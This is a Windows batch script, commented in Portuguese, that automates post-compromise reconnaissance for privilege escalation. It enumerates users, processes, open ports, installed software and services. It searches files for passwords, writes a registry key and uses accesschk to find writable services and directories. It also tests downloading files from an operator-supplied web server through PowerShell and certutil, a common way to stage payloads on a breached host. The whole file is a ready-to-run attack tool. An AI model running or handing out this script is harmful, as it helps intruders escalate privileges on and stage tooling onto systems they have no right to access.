@ECHO off & SETLOCAL EnableDelayedExpansion

title Perguntas a serem feitas
ECHO.
echo 1. Em qual sistem/version me encontro?
systeminfo
ECHO.
echo 2. Quem somos?
net user %username%
ECHO.
echo 3. Onde estamos?
echo %cd%
ECHO.
echo 4. Existem outros users?
net user
ECHO.
echo 5. Rodando agora? Quais portas?
tasklist
netstat -nao | findstr LISTENING
ECHO.
echo 6. Programas instalado?
wmic product get Name, Version
reg query HKLM\SOFTWARE
ECHO.
echo 7. Senhas?
findstr /SI password *.txt
ECHO.
echo 8. Alterar registros?
reg add HKLM\Software\teste
ECHO.
echo 9. Serviços? 
sc query state= all 
ECHO.
echo 10. Serviços vuln?
accesschk.exe -uqwcv %username% * /accepteula
ECHO.
echo 11. Existe Firewall?
netsh advfirewall show allprofiles state
ECHO.
echo 12. Diretórios com permissão de escrita herdada para download?
accesschk.exe -uqwdv %username% * /accepteula

echo 13. Existe algum meio para download/upload de arquivos?
set /p IP=Digite o ip do seu servidor web em python3 em CIDR (0.0.0.0):
powershell -Command "iwr -outf c:\users\public\powershellok.txt http://%IP%:80/powershellok.txt"
certutil.exe -urlcache -split -f "http://%IP%:80/certutilok.txt" c:\users\public\certutilok.txt
dir c:\users\public\powershellok.txt
dir c:\users\public\certutilok.txt
ECHO.
echo 14. Caso, consiga visualizar informações do arquivo powershellok.txt e certutilok.txt, é possível usar respectivamente:
echo powershell -Command "iwr -outf c:\users\public\powershellok.txt http://IP:80/powershellok.txt"
certutil.exe -urlcache -split -f "http://%IP%:80/certutilok.txt" c:\users\public\certutilok.txt
ECHO.
echo 15. Qual o kernel?
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
ECHO.

TITLE Perguntas a serem feitas
ECHO.---
ECHO.Completo.
PAUSE >NUL 
EXIT /B
